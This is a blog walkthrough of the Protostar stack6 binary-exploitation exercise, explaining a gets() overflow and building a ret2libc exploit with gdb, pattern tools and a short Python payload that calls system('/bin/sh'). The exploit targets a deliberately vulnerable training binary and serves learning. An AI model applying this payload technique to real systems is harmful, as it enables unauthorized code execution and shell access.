---
title: "ROP: ret2libc Attack -Protostar6"
author: "Trevor saudi"
date: 2021-05-12T10:30:13.245Z
lastmod: 2022-05-24T14:32:01+03:00

description: ""


image: "/posts/2021-05-12_rop-ret2libc-attack-protostar6/images/2.png" 
images:
 - "/posts/2021-05-12_rop-ret2libc-attack-protostar6/images/1.png"
 - "/posts/2021-05-12_rop-ret2libc-attack-protostar6/images/2.png"
 - "/posts/2021-05-12_rop-ret2libc-attack-protostar6/images/3.png"
 - "/posts/2021-05-12_rop-ret2libc-attack-protostar6/images/4.png"
 - "/posts/2021-05-12_rop-ret2libc-attack-protostar6/images/5.png"
 - "/posts/2021-05-12_rop-ret2libc-attack-protostar6/images/6.png"
 - "/posts/2021-05-12_rop-ret2libc-attack-protostar6/images/7.jpeg"


aliases:
    - "/rop-ret2libc-attack-protostar6-ab537d59b6a8"

---

## Bypassing stack pointer restrictions to gain arbitrary code execution

![image](/posts/2021-05-12_rop-ret2libc-attack-protostar6/images/1.png#layoutTextWidth)


[_Protostar_](https://www.vulnhub.com/entry/exploit-exercises-protostar-v2,32/) _is a series of beginner binary exploitation challenges which showcases concepts like basic stack-based buffer overflows, bypassing stack protections and even performing format string attacks. I tried out these challenges as I have close to 0 experience with binary exploitation and wanted to learn some of it and it turned out fun. So let’s get to_ [_protostar6_](https://exploit.education/protostar/stack-six/) _and learn some ret2libc !_

### Source code analysis and some recon

We are given the source code below to protostar6.c

```C
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

void getpath()
{
  char buffer[64];
  unsigned int ret;

  printf("input path please: "); fflush(stdout);

  gets(buffer);

  ret = __builtin_return_address(0); 

  if((ret & 0xbf000000) == 0xbf000000) { 
      printf("bzzzt (%p)\n", ret); 
      _exit(1);
  }

  printf("got path %s\n", buffer);
}

int main(int argc, char **argv)
{
  getpath();
}
```

As of previous challenges, our goal is get code execution on the target host which has the compiled binary of this source code. Some of the key things to understand here are:

*   ```gets(buffer) :``` The program will ask as for an input and store it an ```buffer of size 64 bytes.``` Gets is a vulnerable function in C that causes stack overflows
*   ```ret``` : __builtin_return_address(0) - This function checks the current return address on the stack and sets it to a variable ret
*   ```if((ret &amp; 0xbf000000) == 0xbf000000) :``` This check performs a ```bitwise AND``` operation with the ```current address on the stack``` with the hex value ```0xbf000000``` and then compares it with 0xbf000000. Essentially what this means is that, it checks if the first byte in the return address is equal to 0xbf, since the remaining bytes will be converted to 0 in the AND operation.````Suppose our return address points to``` 0xbfffff01, the check is performed as follows```  
Operation``` |    ```HEX```    |    ```Binary```  
__________|___________|__________________________________________  

           0xbfffff01 = 10111111 11111111 11111111 00000001  
      ```AND```  0xbf000000 = 10111111 00000000 00000000 00000000  
_________________________________________________________________             
The AND operation gives 0xbf000000. So any address beginning with 0xbf will cause the condition to return to true and exit the program`

*   ```_exit(0) :``` A system call to exit the function if the operation above gives us an address beginning with 0xbf

### Logic behind the non-executable stack protection

In classic buffer overflows, our goal is usually to overwrite the instruction pointer / the return address with the address at the top of the stack where we put our shell code and get code execution.

But in this case, if we were to overwrite the return address with an address on the stack , the operation fails and the program exits. Let us see why using gdb

![image](/posts/2021-05-12_rop-ret2libc-attack-protostar6/images/2.png#layoutTextWidth)


Running the program and viewing how the addresses are mapped in memory we see something interesting. All addresses in the stack begin with 0xbf thus hijacking the control flow and pointing to the stack will fail

### ret2libc Exploit

A ret2libc (return to libc, or return to the C library) attack is one in which the attacker does not require any shellcode to take control of a target, vulnerable process.

“ Every time you write a C program, you use one or the other of the inbuilt functions, like `printf`, `scanf`, `puts` etc. Have you wondered where the definitions of these functions lie? All the standard C functions have been compiled into a single file, named ```the standard C library``` or the `libc`.You can use the `ldd` command to find out which libc is being used by an application. ”

![image](/posts/2021-05-12_rop-ret2libc-attack-protostar6/images/3.png#layoutTextWidth)


We can leverage this technique by jumping to the return address of libc . libc has a syscall named `system` that we will use to execute ‘/bin/sh’ and gain shell

### Developing the exploit

1.  We begin by finding the location of the EIP. Generate the crash pattern and supply in gdb

```bash
/usr/bin/msf-pattern_create -l 100  
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
```

*   Supply the pattern and note down the address in the EIP
![image](/posts/2021-05-12_rop-ret2libc-attack-protostar6/images/4.png#layoutTextWidth)


*   Let us get the offset of the pattern 
```bash
/usr/bin/msf-pattern_offset -l 100 -q 0x37634136  
[*] Exact match at offset 80
```

2. Finding the address of libc

*   As noted earlier this can be done using `info proc map` the location of the libc is at `/lib/libc-2.11.2.so` with address `0xb7e97000` . The address in this case does not start with 0xbf hence we can load it onto the stack bypassing the stack protection
![image](/posts/2021-05-12_rop-ret2libc-attack-protostar6/images/5.png#layoutTextWidth)


3. Finding the address of the ```system``` syscall
`(gdb) p system ```&lt;--- p means print```  
$1 = {&lt;text variable, no debug info&gt;} 0xb7ecffb0 &lt;__libc_system&gt;  
(gdb)`

4. Finding the location of the ‘/bin/sh’ within libc
`root@protostar:/opt/protostar/bin# strings -a -t x /lib/libc-2.11.2.so | grep &#34;/bin/sh&#34;  
 11f3bf /bin/sh  

`

*   strings command lists all readable strings
*   a scans through the entire file
*   -t x will print the addresses in hex
*   grep locates the string we specify with ‘/bin/sh’

In summary our exploit will

*   fill up the padding using 80 characters to reach the EIP.
*   Overwrite the EIP using the `system` syscall address which gets loaded onto the stack.
*   Since the stack will return control flow to the program, we still want to be in control of the EIP so we can chain multiple function calls. We cause the EIP to segfault using an invalid address that will be loaded onto the stack.
*   Then we load the address of the location of the ‘/bin/sh’ which will be `the libc address + offset of ‘/bin/sh’` that we found above.
*   Now the next address on the stack will be pointing to the string `‘/bin/sh’ `which system executes as `system(‘/bin/sh’)` and gives a shell

### Putting together a python exploit script

You could use pwntools for this but I will keep the walkthrough simple.
`import struct``## EIP OFFSET  
payload = &#34;A&#34;*80``## libc SYSTEM SYSCALL  
system = struct.pack(&#34;I&#34;,0xb7ecffb0)``## Ret address after system  
ret = &#34;\x90&#34; * 4``## libc /bin/sh  
shell = struct.pack(&#34;I&#34;,0xb7e97000+0x11f3bf)``print (payload + system+ret+shell)`

We run the exploit and concatenate with the `cat` command to open an stdin stream so we have access to the shell we get

![image](/posts/2021-05-12_rop-ret2libc-attack-protostar6/images/6.png#layoutTextWidth)


If this walkthrough is not enough, I recommend using other resources to understand the concept of ret2libc as it may not be easy to grasp on the first try.

Happy hacking :)

![image](/posts/2021-05-12_rop-ret2libc-attack-protostar6/images/7.jpeg#layoutTextWidth)
